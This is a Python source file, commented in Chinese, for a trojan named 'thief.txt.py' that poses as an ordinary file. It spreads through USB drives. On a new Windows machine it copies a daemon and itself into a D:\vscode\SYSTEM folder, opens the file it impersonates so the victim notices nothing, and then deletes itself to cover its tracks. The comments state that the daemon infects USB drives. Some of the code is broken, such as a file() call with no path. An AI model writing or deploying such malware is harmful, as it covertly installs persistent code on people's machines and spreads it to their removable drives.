import os
import shutil
import subprocess
import psutil
import win32api, win32con

DAEMON_NAME="daemon.py"
THIEF_NAME="thief.txt.py"
DAEMON_PATH="D:\\vscode\\SYSTEM\\daemon.py"
THIEF_PATH="D:\\vscode\\SYSTEM\\thief.txt.py"
ROOT_PATH="D:\\vscode\\SYSTEM\\"

class computer:
    drive=["A:\\","B:\\","C:\\","D:\\","E:\\","F:\\","G:\\","H:\\","I:\\","J:\\","K:\\","L:\\","M:\\","N:\\","O:\\","P:\\","Q:\\","R:\\","S:\\","T:\\","U:\\","V:\\","W:\\","X:\\","Y:\\","Z:\\"]
    enermy=False

    def __init__(self):
        for d in self.drive:
            if not(os.path.exists(d)): self.drive.remove(d)
        if not(os.path.exists(ROOT_PATH)): self.enermy=True

class file:
    def __init__(self, path1):
        self.path=path1
        self.dir=os.path.isdir(path1) #self.dir变量用于记录是否是文件夹

    def copy(self, destination):
        if self.dir==True: shutil.copytree(self.path, destination)
        else: shutil.copy(self.path, destination)

    def delete(self):
        if self.dir==True: shutil.rmtree(self.path)
        else: os.unlink(self.path)
    
    def move(self, destination):
        self.copy(destination)
        self.delete()

def attack():
    if not(os.path.exists(ROOT_PATH)): os.makedirs(ROOT_PATH)
    #1.复制daemon守护进程
    daemon_file=file(os.getcwd()+DAEMON_NAME)
    daemon_file.copy(DAEMON_PATH)
    #2.复制本程序到目标电脑,因为daemon在感染u盘时需要复制本程序
    thief_file=file(os.path.abspath(__file__))
    thief_file.copy(THIEF_PATH)


def getfile(): #获得被冒充的文件的路径
    s=os.path.abspath(__file__)
    s2=s.split(".")
    return s2[0]+"."+s2[1]

def getname(): #获得被冒充的文件名
    s=os.path.relpath(__file__)
    s2=s.split(".")
    return s2[0]+"."+s2[1]

#1.把daemon复制到目标计算机
target=computer()
if target.enermy==True: 
    attack()

#2.正常打开该打开的文件
path=getfile() #此程序冒充的真实文件
if not(os.path.exists(path)):
    disks=psutil.disk_partitions()
    for d in disks:
        dev=d.device
        if d.fstype=="FAT32" and os.path.exists(dev+getname()):
            true_file=file()
            true_file.move(path)
print(path)
os.system(path)

#3.删除冒充者(此文件),并将被冒充者复原
if target.enermy==False:
    win32api.SetFileAttributes(os.getcwd()+getname(), win32con.FILE_ATTRIBUTE_NORMAL)
    thisfile=file(__file__)
    thisfile.delete()